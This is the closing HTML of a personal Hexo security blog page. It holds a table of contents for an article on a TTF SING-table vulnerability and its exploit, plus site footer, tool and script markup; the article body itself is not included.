		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#TTF-%E7%BB%93%E6%9E%84%E4%B8%8E-SING-%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="nav-text">TTF 结构与 SING 表结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E5%88%86%E6%9E%90"><span class="nav-text">Exploit 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-%E4%BB%A3%E7%A0%81%E6%A6%82%E8%A7%88"><span class="nav-text">Exploit 代码概览</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#make-ttf-%E5%87%BD%E6%95%B0"><span class="nav-text">make_ttf 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#make-js-%E5%87%BD%E6%95%B0"><span class="nav-text">make_js 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2020</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">7erry</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        69 posts in total
                    </span>
                    
                        <span>
                            219.3k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine" rel="external nofollow noreferrer">Redefine v2.8.4</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script>
    
    
<script src="/js/build/plugins/mermaid.js"></script>









    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>